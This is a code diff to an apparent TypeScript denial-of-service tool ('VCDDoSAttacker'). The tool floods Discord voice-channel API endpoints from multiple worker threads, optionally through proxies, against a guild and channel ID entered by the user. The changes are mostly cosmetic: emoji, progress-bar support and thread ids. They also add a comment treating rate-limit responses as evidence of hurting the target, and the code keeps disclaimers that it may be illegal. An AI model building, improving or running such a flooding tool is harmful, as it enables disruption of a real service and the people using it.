@@ -4,6 +4,7 @@ import { createInterface } from 'readline';
 import chalk from 'chalk';
 import Table from 'cli-table3';
 import figlet from 'figlet';
+import ProgressBar from 'progress';
 
 dotenv.config();
 
@@ -82,10 +83,10 @@ class VCDDoSAttacker {
         const proxies = process.env.PROXY_LIST?.split(',') || [];
         this.proxyList = proxies.filter(proxy => proxy.trim() !== '');
         if (this.proxyList.length > 0) {
-          console.log(chalk.green(`Loaded ${this.proxyList.length} proxies`));
+          console.log(chalk.green(`✓ Loaded ${this.proxyList.length} proxies`));
         }
       } catch (error) {
-        console.log(chalk.yellow('No proxy list found, using direct connections'));
+        console.log(chalk.yellow('⚠ No proxy list found, using direct connections'));
       }
     }
   }
@@ -109,7 +110,7 @@ class VCDDoSAttacker {
       .replace('{user_id}', '123456789012345678'); // Random user ID
   }
 
-  private async makeAttackRequest(): Promise<boolean> {
+  private async makeAttackRequest(threadId: number): Promise<boolean> {
     const endpoint = this.getRandomEndpoint();
     const method = Math.random() > 0.7 ? 'POST' : 'GET';
     
@@ -135,16 +136,18 @@ class VCDDoSAttacker {
       }
       return false;
     } catch (error: any) {
+      // Discord API errors are expected (rate limits, invalid requests)
       if (error.response?.status === 429) {
+        // Rate limited - good sign that we're affecting the target
         return true;
       }
       return false;
     }
   }
 
-  private async workerThread(): Promise<void> {
+  private async workerThread(threadId: number): Promise<void> {
     for (let i = 0; i < this.config.requestsPerThread && this.running; i++) {
-      const success = await this.makeAttackRequest();
+      const success = await this.makeAttackRequest(threadId);
       
       // Update stats
       this.stats.totalRequests++;
@@ -210,7 +213,7 @@ class VCDDoSAttacker {
     
     console.log('\n' + statsTable.toString());
     
-    // Progress indicator
+    // Progress bar
     const totalRequests = this.config.threads * this.config.requestsPerThread;
     const progress = Math.min((this.stats.totalRequests / totalRequests) * 100, 100);
     
@@ -224,20 +227,20 @@ class VCDDoSAttacker {
 
   async start(): Promise<void> {
     if (this.running) {
-      console.log(chalk.yellow('Attack already running'));
+      console.log(chalk.yellow('⚠ Attack already running'));
       return;
     }
 
     this.running = true;
     this.stats.startTime = new Date();
     
-    console.log(chalk.red('Starting DDoS attack...'));
-    console.log(chalk.yellow('WARNING: This may violate Discord ToS and local laws'));
+    console.log(chalk.red('🚀 Starting VC DDoS attack...'));
+    console.log(chalk.yellow('⚠ WARNING: This may violate Discord ToS and local laws'));
     
     // Start worker threads
     this.threads = [];
     for (let i = 0; i < this.config.threads; i++) {
-      const thread = new WorkerThread(this);
+      const thread = new WorkerThread(i, this);
       this.threads.push(thread);
       thread.start();
     }
@@ -249,7 +252,7 @@ class VCDDoSAttacker {
       } else {
         clearInterval(statsInterval);
         this.renderStats();
-        console.log(chalk.green('\nAttack completed!'));
+        console.log(chalk.green('\n✓ Attack completed!'));
       }
     }, 1000);
 
@@ -262,7 +265,7 @@ class VCDDoSAttacker {
   }
 
   stop(): void {
-    console.log(chalk.yellow('\nStopping attack...'));
+    console.log(chalk.yellow('\n🛑 Stopping attack...'));
     this.running = false;
   }
 
@@ -272,12 +275,12 @@ class VCDDoSAttacker {
 }
 
 class WorkerThread {
-  constructor(private attacker: VCDDoSAttacker) {}
+  constructor(private id: number, private attacker: VCDDoSAttacker) {}
 
   private workerPromise?: Promise<void>;
 
   start(): void {
-    this.workerPromise = this.attacker['workerThread']();
+    this.workerPromise = this.attacker['workerThread'](this.id);
   }
 
   async waitForCompletion(): Promise<void> {
@@ -299,8 +302,8 @@ function question(query: string): Promise<string> {
 
 async function promptForConfig(): Promise<AttackConfig> {
   console.clear();
-  console.log(chalk.red(figlet.textSync("rwb's DDoS tool", { font: 'Slant' })));
-  console.log(chalk.yellow('WARNING: This tool is for educational purposes only\n'));
+  console.log(chalk.red(figlet.textSync('VC DDoS Setup', { font: 'Slant' })));
+  console.log(chalk.yellow('⚠  WARNING: This tool is for educational purposes only\n'));
 
   const targetGuildId = await question(chalk.cyan('Enter target Guild/Server ID: '));
   const targetChannelId = await question(chalk.cyan('Enter target Voice Channel ID: '));
@@ -336,7 +339,7 @@ async function main() {
   try {
     const config = await promptForConfig();
     
-    console.log(chalk.yellow('\nFINAL WARNING:'));
+    console.log(chalk.yellow('\n⚠  FINAL WARNING:'));
     console.log(chalk.yellow('• This may violate Discord Terms of Service'));
     console.log(chalk.yellow('• This may be illegal in your jurisdiction'));
     console.log(chalk.yellow('• Use at your own risk'));
@@ -371,7 +374,7 @@ async function main() {
     console.log(chalk.cyan(`Duration: ${((finalStats.endTime!.getTime() - finalStats.startTime.getTime()) / 1000).toFixed(1)}s`));
     
   } catch (error: any) {
-    console.error(chalk.red('\n Error:'), error.message);
+    console.error(chalk.red('\n❌ Error:'), error.message);
   } finally {
     rl.close();
   }
